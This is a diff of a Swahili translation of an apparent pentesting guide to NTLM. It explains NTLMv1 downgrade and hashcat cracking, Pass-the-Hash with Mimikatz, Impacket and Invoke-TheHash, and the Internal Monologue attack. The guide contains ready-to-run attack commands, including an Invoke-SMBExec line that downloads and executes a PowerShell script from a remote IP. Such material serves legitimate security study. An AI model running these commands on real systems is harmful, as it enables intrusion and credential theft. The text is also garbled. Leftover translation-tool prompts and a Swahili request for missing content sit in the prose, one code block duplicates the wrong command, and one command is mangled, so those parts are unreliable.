@@ -5,38 +5,41 @@
 
 ## Taarifa za Msingi
 
-Katika mazingira ambamo **Windows XP na Server 2003** zinafanya kazi, hashes za LM (Lan Manager) hutumiwa, ingawa inatambulika kwa upana kwamba zinaweza kuvunjwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haitumiki, na inawakilisha hash ya string tupu.
+Katika mazingira ambako **Windows XP na Server 2003** zinatumika, hash za LM (Lan Manager) hutumika, ingawa inajulikana sana kuwa zinaweza kuathiriwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, huonyesha kuwa LM haitumiki; hii ndiyo hash ya mfuatano tupu.
 
-Kwa chaguo-msingi, itifaki ya authentication ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) hutumika katika hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa domain, Kerberos kutofanya kazi kutokana na configuration isiyo sahihi, au wakati connections zinapojaribiwa kwa kutumia IP address badala ya hostname halali.
+Kwa chaguo-msingi, itifaki ya uthibitishaji ya **Kerberos** ndiyo hutumika zaidi. NTLM (NT LAN Manager) hutumika katika hali mahususi: Active Directory haipo, domain haipo, Kerberos haifanyi kazi kwa sababu ya usanidi usio sahihi, au miunganisho inapojaribiwa kwa kutumia anwani ya IP badala ya hostname halali.
 
-Kuwepo kwa header ya **"NTLMSSP"** kwenye network packets huashiria mchakato wa NTLM authentication.
+Kuwepo kwa kichwa cha **"NTLMSSP"** kwenye pakiti za mtandao huashiria mchakato wa uthibitishaji wa NTLM.
 
-Support ya authentication protocols - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyo katika `%windir%\Windows\System32\msv1\_0.dll`.
+Usaidizi wa itifaki za uthibitishaji - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyo kwenye `%windir%\Windows\System32\msv1\_0.dll`.
 
 **Mambo Muhimu**:
 
-- LM hashes ziko hatarini, na LM hash tupu (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kwamba haitumiki.
-- Kerberos ndiyo authentication method ya chaguo-msingi, huku NTLM ikitumika tu katika hali fulani.
-- NTLM authentication packets zinaweza kutambuliwa kwa header ya "NTLMSSP".
-- LM, NTLMv1, na NTLMv2 protocols zinaungwa mkono na system file `msv1\_0.dll`.
+- Hash za LM zina udhaifu, na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kuwa haitumiki.
+- Kerberos ndiyo njia chaguomsingi ya uthibitishaji; NTLM hutumika tu katika hali fulani.
+- Pakiti za uthibitishaji wa NTLM hutambulika kwa kichwa cha "NTLMSSP".
+- Itifaki za LM, NTLMv1, na NTLMv2 zinaungwa mkono na faili ya mfumo `msv1\_0.dll`.
 
 ## LM, NTLMv1 na NTLMv2
 
-Unaweza kuangalia na kusanidi protocol itakayotumika:
+Unaweza kuangalia na kusanidi itifaki itakayotumika:
 
 ### GUI
 
-Tekeleza _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Kuna viwango 6 (kutoka 0 hadi 5).
+Tekeleza _secpol.msc_ -> Sera za ndani -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uthibitishaji cha LAN Manager. Kuna viwango 6 (kuanzia 0 hadi 5).
 
-![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Kuna viwango 6 (kutoka 0 hadi 5)](<../../images/image (919).png>)
+![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Sera za ndani - Chaguo za Usalama - Usalama wa Mtandao: Kiwango cha uthibitishaji cha LAN Manager. Kuna viwango 6 (kuanzia 0 hadi 5)](<../../images/image (919).png>)
 
 ### Registry
 
 Hii itaweka kiwango cha 5:
+
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
+
 Thamani zinazowezekana:
+
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -45,54 +48,58 @@ Thamani zinazowezekana:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+
 ## Mpangilio wa msingi wa uthibitishaji wa NTLM Domain
 
-1. **user** huwasilisha **credentials** zake
-2. Mashine ya client **hutuma authentication request** ikituma **domain name** na **username**
-3. **server** hutuma **challenge**
-4. **client** husimba **challenge** kwa kutumia hash ya password kama key na kuituma kama response
-5. **server hutuma** kwa **Domain controller** **domain name, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au domain name ni jina la server, credentials **hukaguliwa locally**.
-6. **domain controller hukagua ikiwa kila kitu kiko sahihi** na hutuma maelezo kwa server
+1. **Mtumiaji** huingiza **credentials** zake
+2. Mashine ya client **hutuma ombi la authentication** pamoja na **jina la domain** na **username**
+3. **Server** hutuma **challenge**
+4. **Client husimba kwa njia fiche** **challenge** kwa kutumia hash ya password kama key, kisha huituma kama response
+5. **Server hutuma** kwa **Domain controller** **jina la domain, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au jina la domain ni jina la server, credentials **hukaguliwa ndani ya mashine**.
+6. **Domain controller hukagua kama kila kitu kiko sawa** na kutuma taarifa kwa server
 
-**server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa kuwa Domain Controller inajua password ya server (iko ndani ya db ya **NTDS.DIT**).
+**Server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa kuwa Domain Controller inajua password ya server (ipo ndani ya db ya **NTDS.DIT**).
 
-### Mpangilio wa Local NTLM authentication
+### Mpangilio wa uthibitishaji wa NTLM wa ndani
 
-Authentication ni kama ilivyotajwa **hapo awali, lakini** **server** inajua **hash ya user** anayejaribu kufanya authentication ndani ya faili la **SAM**. Kwa hiyo, badala ya kuuliza Domain Controller, **server hujikagua yenyewe** ili kubaini ikiwa user anaweza kufanya authentication.
+Uthibitishaji hufanyika kama ilivyoelezwa **hapo awali, lakini** **server** inajua **hash ya mtumiaji** anayejaribu kufanya authentication ndani ya faili la **SAM**. Kwa hiyo, badala ya kuuliza Domain Controller, **server itajikagua yenyewe** ili kubaini kama mtumiaji anaweza kufanya authentication.
 
 ### NTLMv1 Challenge
 
-**urefu wa challenge ni bytes 8** na **response ina urefu wa bytes 24**.
+**Urefu wa challenge ni baiti 8** na **response ina urefu wa baiti 24**.
 
-**NT hash (16bytes)** imegawanywa katika **sehemu 3 za 7bytes kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa zero**. Kisha, **challenge** husimbwa **kando** kwa kila sehemu na **bytes zilizofanyiwa cipher** huunganishwa. Jumla: 8B + 8B + 8B = 24Bytes.
+**NT hash (baiti 16)** hugawanywa katika **sehemu 3 za baiti 7 kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa kwa sufuri**. Kisha, **challenge** husimbwa kwa njia fiche kando kwa kutumia kila sehemu, na baiti zilizosimbwa kwa njia fiche **huunganishwa**. Jumla: 8B + 8B + 8B = Baiti 24.
 
 **Matatizo**:
 
 - Ukosefu wa **randomness**
 - Sehemu 3 zinaweza **kushambuliwa kando** ili kupata NT hash
 - **DES inaweza kuvunjwa**
-- Key ya 3º huundwa kila mara kwa **zeros 5**.
-- Kwa kupewa **challenge ileile**, **response** itakuwa **ileile**. Kwa hiyo, unaweza kumpa victim string "**1122334455667788**" kama **challenge** na kushambulia response kwa kutumia **precomputed rainbow tables**.
+- Key ya **sehemu ya 3** huundwa kila wakati kwa **sufuri 5**.
+- Ikitolewa **challenge ileile**, **response** itakuwa **ileile**. Kwa hiyo, unaweza kumpa mwathiriwa mfuatano "**1122334455667788**" kama **challenge**, kisha kushambulia response kwa kutumia **rainbow tables zilizokokotolewa awali**.
 
 ### NTLMv1 attack
 
-Unconstrained delegation si ya kawaida sana katika mazingira ya kisasa, lakini **Print Spooler service** inayoweza kufikiwa bado inaweza kutumiwa vibaya ili kulazimisha authentication kwa host hiyo.
+Unconstrained delegation haitumiki sana katika mazingira ya kisasa, lakini huduma ya **Print Spooler** inayoweza kufikiwa bado inaweza kutumiwa kulazimisha authentication kwenye host hiyo.
 
-Unaweza kutumia vibaya credentials/sessions ulizonazo tayari kwenye AD ili **kuiomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, ukitumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka authentication challenge kuwa 1122334455667788**, kunasa jaribio la authentication, na ikiwa lilifanywa kwa kutumia **NTLMv1** utaweza **ku-crack**.\
-Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag `--lm`** ili kujaribu **kudowngrade** **authentication**.\
-_Note kwamba kwa technique hii authentication lazima ifanywe kwa kutumia NTLMv1 (NTLMv2 si valid)._
+Unaweza kutumia vibaya credentials/sessions ulizonazo tayari kwenye AD ili **kuiomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka challenge ya authentication kuwa 1122334455667788**, kunasa jaribio la authentication, na ikiwa lilitumia **NTLMv1**, utaweza **kuivunja**.\
+Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag ya `--lm`** ili kujaribu **kushusha kiwango** cha **authentication**.\
+_Kumbuka kuwa kwa mbinu hii, authentication lazima ifanyike kwa kutumia NTLMv1 (NTLMv2 haifai)._
 
-Kumbuka kwamba printer itatumia computer account wakati wa authentication, na computer accounts hutumia passwords **ndefu na za random** ambazo **huenda usiweze ku-crack** kwa kutumia **dictionaries** za kawaida. Lakini authentication ya **NTLMv1** **hutumia DES** ([maelezo zaidi hapa](#ntlmv1-challenge)), kwa hiyo kwa kutumia services maalum za ku-crack DES utaweza ku-crack (kwa mfano, unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com)).
+Kumbuka kuwa printer itatumia akaunti ya kompyuta wakati wa authentication, na akaunti za kompyuta hutumia **password ndefu na za nasibu** ambazo huenda **usiweze kuzivunja** kwa kutumia **dictionaries** za kawaida. Lakini authentication ya **NTLMv1** **hutumia DES** ([maelezo zaidi hapa](#ntlmv1-challenge)), kwa hiyo utaweza kuivunja ukitumia huduma maalum za kuvunja DES (kwa mfano, unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com)).
 
-### NTLMv1 attack with hashcat
+### NTLMv1 attack kwa kutumia hashcat
 
-NTLMv1 pia inaweza kushambuliwa kwa kutumia [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), ambayo hubadilisha messages zilizonaswa za NTLMv1 kuwa formats zinazofaa kwa Hashcat.<sup>[[1]](#references)</sup>
+NTLMv1 inaweza pia kushambuliwa kwa kutumia [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), ambayo hubadilisha ujumbe wa NTLMv1 uliokamatwa kuwa fomati zinazofaa kwa Hashcat.<sup>[[1]](#references)</sup>
 
-Amri
+Amri yake
+
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-Please provide the English Markdown content to translate.
+
+ingetoa matokeo yafuatayo:
+
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -118,16 +125,22 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-Please provide the content to include in the file.
+
+Hakuna maudhui yaliyotolewa baada ya “Create a file with the contents of:”. Tafadhali tuma maandishi unayotaka yatafsiriwe.
+
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-Endesha hashcat (distributed ni bora kupitia tool kama hashtopolis), kwani vinginevyo hii itachukua siku kadhaa.
+
+Endesha hashcat (ni bora kuisambaza kupitia zana kama hashtopolis) kwani vinginevyo itachukua siku kadhaa.
+
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-Katika hali hii tunajua kwamba password yake ni password, kwa hiyo tutadanganya kwa madhumuni ya demo:
+
+Katika hali hii tunajua nenosiri lake ni password, kwa hiyo tutadanganya kwa madhumuni ya demo:
+
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -136,7 +149,9 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Sasa tunahitaji kutumia hashcat-utilities kubadilisha funguo za des zilizovunjwa kuwa sehemu za NTLM hash:
+
+Sasa tunahitaji kutumia hashcat-utilities kubadilisha funguo za DES zilizopasuliwa kuwa sehemu za hash ya NTLM:
+
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -144,152 +159,171 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-Tafadhali tuma sehemu ya mwisho unayotaka nitafsiri.
+
+Hatimaye, sehemu ya mwisho:
+
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-Please provide the English text to translate.
+
+Viunganishe pamoja:
+
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
+
 ### NTLMv2 Challenge
 
-**Urefu wa challenge ni baiti 8** na **majibu 2 hutumwa**: Moja lina urefu wa **baiti 24** na urefu wa **jingine** ni **wa kubadilika**.
+**Urefu wa challenge ni baiti 8** na **majibu 2 hutumwa**: Moja lina **urefu wa baiti 24** na urefu wa **jingine** hubadilika.
 
-**Jibu la kwanza** huundwa kwa kutumia HMAC_MD5 kusimba **string** inayoundwa na **client na domain**, na kutumia kama **key** **hash ya MD4** ya **NT hash**. Kisha, **matokeo** yatatumika kama **key** kusimba **challenge** kwa kutumia HMAC_MD5. Kwenye hii, **client challenge ya baiti 8 itaongezwa**. Jumla: Baiti 24.
+**Jibu la kwanza** huundwa kwa kusimba kwa kutumia **HMAC_MD5** **string** inayoundwa na **client na domain**, na kutumia **hash MD4** ya **NT hash** kama **key**. Kisha, **matokeo** hutumika kama **key** kusimba **challenge** kwa kutumia **HMAC_MD5**. Kisha, **client challenge ya baiti 8 huongezwa**. Jumla: Baiti 24.
 
 **Jibu la pili** huundwa kwa kutumia **thamani kadhaa** (client challenge mpya, **timestamp** ili kuzuia **replay attacks**...)
 
-Ikiwa una **PCAP iliyo na exchange ya successful authentication**, toa domain, username, server challenge, na NTLMv2 response, fomati capture kwa Hashcat, na utumie mode `5600` kujaribu kurejesha password. Mwongozo wa vitendo uliowekwa kwenye archive unaendelea kuhifadhi utaratibu wa kutoa packet fields, huku mifano ya Hashcat ikifafanua format inayokubalika sasa.<sup>[[2]](#references)[[7]](#references)</sup>
+Ikiwa una **PCAP iliyo na mabadilishano ya uthibitishaji yaliyofaulu**, toa domain, username, server challenge na jibu la NTLMv2, fomati capture kwa Hashcat, na utumie mode `5600` kujaribu kurejesha password. Mwongozo wa vitendo uliohifadhiwa unaendelea kuweka utaratibu wa kutoa sehemu za packet, huku mifano ya Hashcat ikifafanua format inayokubaliwa sasa.<sup>[[2]](#references)[[7]](#references)</sup>
 
 ## Pass-the-Hash
 
-**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kujiwakilisha kama** yeye.\
-Unahitaji kutumia **tool** ambayo **itafanya** **NTLM authentication kwa kutumia** hiyo **hash**, au unaweza kuunda **sessionlogon** mpya na **kuingiza** hiyo **hash ndani ya LSASS**, ili **NTLM authentication inapofanywa**, **hash hiyo itumike.** Chaguo la mwisho ndilo mimikatz hufanya.
+**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kuiga utambulisho** wake.\
+Unahitaji kutumia **tool** itakayotekeleza **uthibitishaji wa NTLM kwa kutumia** **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** **hash** hiyo ndani ya **LSASS**, ili kila **uthibitishaji wa NTLM utakapotekelezwa**, **hash** hiyo itatumika. Hili ndilo chaguo la mwisho ambalo mimikatz hutumia.
 
-**Tafadhali kumbuka kwamba unaweza kufanya Pass-the-Hash attacks pia kwa kutumia Computer accounts.**
+**Tafadhali kumbuka kuwa unaweza pia kutekeleza mashambulizi ya Pass-the-Hash kwa kutumia Computer accounts.**
 
 ### **Mimikatz**
 
-**Lazima iendeshwe kama administrator**
+**Lazima iendeshwe kama msimamizi**
+
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-This huzindua mchakato chini ya mtumiaji wa sasa wa ndani, huku LSASS ikihusisha credentials zilizotolewa na network logon yake ya kutoka. Kisha unaweza kufikia network resources kama mtumiaji huyo aliyepewa, sawa na `runas /netonly`, bila kujua plaintext password.
 
-### Pass-the-Hash kutoka linux
+Hii huzindua mchakato chini ya mtumiaji wa sasa wa ndani, huku LSASS ikihusisha vitambulisho vilivyotolewa na kuingia kwake kwenye mtandao kwa miunganisho inayotoka. Kisha unaweza kufikia rasilimali za mtandao kama mtumiaji aliyetolewa, sawa na `runas /netonly`, bila kujua nenosiri la maandishi wazi.
 
-Unaweza kupata code execution kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
-[**Tazama mifano ya vitendo ya Pass-the-Hash execution.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)
+### Pass-the-Hash kutoka Linux
 
-### Impacket Windows compiled tools
+Unaweza kupata utekelezaji wa msimbo kwenye mashine za Windows kwa kutumia Pass-the-Hash kutoka Linux.\
+[**Tazama mifano ya vitendo ya utekelezaji wa Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)
 
-Unaweza kupakua[ impacket binaries for Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+### Zana za Impacket za Windows zilizokusanywa
+
+Unaweza kupakua[ binaries za Impacket za Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 - **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 - **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-- **atexec.exe** (Katika hali hii unahitaji kubainisha command, cmd.exe na powershell.exe si halali kupata interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-- Kuna Impacket binaries nyingine kadhaa...
+- **atexec.exe** (Katika hali hii unahitaji kubainisha amri; cmd.exe na powershell.exe hazifai kupata shell shirikishi)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+- Kuna binaries nyingine nyingi za Impacket...
 
 ### Invoke-TheHash
 
-Unaweza kupata powershell scripts hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
+Unaweza kupata scripts za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>
 
 #### Invoke-SMBExec
+
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
+
 #### Invoke-WMIExec
+
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
+
 #### Invoke-SMBClient
+
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
+
 #### Invoke-SMBEnum
+
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
+
 #### Invoke-TheHash
 
-Function hii inachanganya modes zilizotangulia. Unaweza kupitisha **several hosts**, kuondoa targets ulizochagua, na kuchagua _SMBExec, WMIExec, SMBClient,_ au _SMBEnum_. Ukichagua **SMBExec** au **WMIExec** bila parameter ya _**Command**_, hukagua tu ikiwa una permissions za kutosha.
+Kazi hii inachanganya modi zilizotangulia. Unaweza kuweka **hosts kadhaa**, kuondoa targets maalum, na kuchagua _SMBExec, WMIExec, SMBClient,_ au _SMBEnum_. Ukichagua **SMBExec** au **WMIExec** bila kigezo cha _**Command**_, hukagua tu ikiwa una ruhusa za kutosha.
+
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
+
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
 ### Windows Credentials Editor (WCE)
 
-**Inahitaji kuendeshwa kama administrator**
+**Lazima iendeshwe kama msimamizi**
 
-Tool hii itafanya kitu kilekile kama mimikatz (itarekebisha memory ya LSASS).
+Zana hii itafanya jambo lilelile kama mimikatz (kurekebisha kumbukumbu ya LSASS).
+
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-### Utekelezaji wa mbali wa Windows kwa mikono kwa kutumia username na password
+
+### Utekelezaji wa mbali wa Windows kwa mikono kwa kutumia jina la mtumiaji na nenosiri
 
 
 {{#ref}}
 ../lateral-movement/
 {{#endref}}
 
-## Kutoa credentials kutoka kwa Windows Host
+## Kutoa vitambulisho kutoka kwa Host ya Windows
 
-Kwa maelezo zaidi, tazama [**Stealing Windows Credentials**](../stealing-credentials/README.md).
+Kwa maelezo zaidi, angalia [**Kuiba Vitambulisho vya Windows**](../stealing-credentials/README.md).
 
-## Internal Monologue attack
+## Shambulio la Internal Monologue
 
-Internal Monologue Attack ni mbinu fiche ya kutoa credentials inayomruhusu attacker kupata NTLM hashes kutoka kwenye mashine ya victim **bila kuingiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye memory na mara nyingi huzuiwa na endpoint security solutions au Credential Guard, attack hii hutumia **local calls kwenda kwenye NTLM authentication package (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza attacker **hushusha viwango vya NTLM** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha hujifanya kuwa user tokens zilizopo zinazopatikana kutoka kwenye processes zinazoendeshwa na huanzisha NTLM authentication locally ili kuzalisha majibu ya NetNTLMv1 kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>
+Shambulio la Internal Monologue ni mbinu fiche ya kutoa vitambulisho inayomwezesha mshambuliaji kupata NTLM hashes kutoka kwenye mashine ya mwathiriwa **bila kuwasiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye kumbukumbu na mara nyingi huzuiwa na suluhisho za usalama wa endpoint au Credential Guard, shambulio hili hutumia **miito ya ndani kwa kifurushi cha uthibitishaji cha NTLM (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza mshambuliaji **hushusha kiwango cha mipangilio ya NTLM** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha huiga tokeni za watumiaji zilizopo zinazopatikana kutoka kwenye michakato inayoendeshwa na kuanzisha uthibitishaji wa NTLM ndani ya mfumo ili kuzalisha majibu ya NetNTLMv1 kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>
 
-Baada ya kukamata majibu haya ya NetNTLMv1, attacker anaweza kurejesha NTLM hashes za awali kwa haraka kwa kutumia **precomputed rainbow tables**, na hivyo kuwezesha Pass-the-Hash attacks zaidi kwa ajili ya lateral movement. Muhimu zaidi, Internal Monologue Attack hubaki fiche kwa sababu haitengenezi network traffic, haiinject code, wala kusababisha memory dumps za moja kwa moja, jambo linalofanya iwe vigumu zaidi kwa defenders kuigundua ikilinganishwa na mbinu za kawaida kama Mimikatz.
+Baada ya kunasa majibu haya ya NetNTLMv1, mshambuliaji anaweza kurejesha haraka hashes za awali za NTLM kwa kutumia **rainbow tables zilizokokotolewa mapema**, na hivyo kuwezesha mashambulio zaidi ya Pass-the-Hash kwa lateral movement. Muhimu zaidi, Shambulio la Internal Monologue hubaki fiche kwa sababu halizalishi trafiki ya mtandao, haliingizi code, wala kuanzisha utupaji wa moja kwa moja wa kumbukumbu, hivyo kufanya iwe vigumu zaidi kwa watetezi kuligundua ikilinganishwa na mbinu za kawaida kama Mimikatz.
 
-Ikiwa NetNTLMv1 haikubaliwi—kwa sababu ya security policies zilizolazimishwa, attacker anaweza kushindwa kupata jibu la NetNTLMv1.
+Ikiwa NetNTLMv1 haikubaliwi—kutokana na sera za usalama zilizowekwa kutekelezwa—mshambuliaji anaweza kushindwa kupata jibu la NetNTLMv1.
 
-Ili kushughulikia hali hii, tool ya Internal Monologue ilisasishwa: hupata server token dynamically kwa kutumia `AcceptSecurityContext()` ili bado **ikamate majibu ya NetNTLMv2** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi ku-crack, bado hufungua njia ya relay attacks au offline brute-force katika hali chache.
+Ili kushughulikia hali hii, zana ya Internal Monologue ilisasishwa: Hupata tokeni ya server kwa nguvu kwa kutumia `AcceptSecurityContext()` ili bado **kunasa majibu ya NetNTLMv2** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi kuvunja, bado hutoa njia ya mashambulio ya relay au brute-force ya offline katika hali chache.
 
-PoC inaweza kupatikana kwenye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>
+PoC inapatikana katika **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>
 
-## NTLM Relay and Responder
+## NTLM Relay na Responder
 
-**Soma mwongozo wenye maelezo zaidi kuhusu jinsi ya kufanya attacks hizo hapa:**
+**Soma mwongozo wa kina zaidi kuhusu jinsi ya kutekeleza mashambulio hayo hapa:**
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
 
-## Kuchanganua NTLM challenges kutoka kwenye network capture
+## Kuchanganua changamoto za NTLM kutoka kwenye nakala ya trafiki ya mtandao
 
 **Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
-## NTLM & Kerberos *Reflection* kupitia Serialized SPNs (CVE-2025-33073)
+## NTLM na Kerberos *Reflection* kupitia SPNs zilizosanifishwa (CVE-2025-33073)
 
-Windows ina mitigations kadhaa zinazojaribu kuzuia *reflection* attacks ambapo NTLM (au Kerberos) authentication inayotoka kwenye host inarelayiwa kurudi kwenye **host hiyo hiyo** ili kupata SYSTEM privileges.
+Windows ina mbinu kadhaa za kupunguza hatari zinazojaribu kuzuia mashambulio ya *reflection*, ambapo uthibitishaji wa NTLM (au Kerberos) unaoanzia kwenye host unarudishwa kupitia relay hadi kwenye **host hiyohiyo** ili kupata haki za SYSTEM.  
 
-Microsoft ilivunja chains nyingi za public kwa kutumia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na patches za baadaye, hata hivyo **CVE-2025-33073** inaonyesha kuwa protections bado zinaweza kuepukwa kwa kutumia vibaya jinsi **SMB client inavyokata Service Principal Names (SPNs)** zilizo na target-info iliyomarshalled (serialized).<sup>[[5]](#references)[[6]](#references)</sup>
+Microsoft ilivunja minyororo mingi ya mashambulio ya umma kwa kutumia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na masasisho ya baadaye, hata hivyo **CVE-2025-33073** inaonyesha kuwa ulinzi bado unaweza kukwepwa kwa kutumia jinsi **mteja wa SMB anavyokata Service Principal Names (SPNs)** zilizo na taarifa lengwa zilizofungwa kwa *marshalled* (serialized).<sup>[[5]](#references)[[6]](#references)</sup>
 
-### TL;DR ya bug
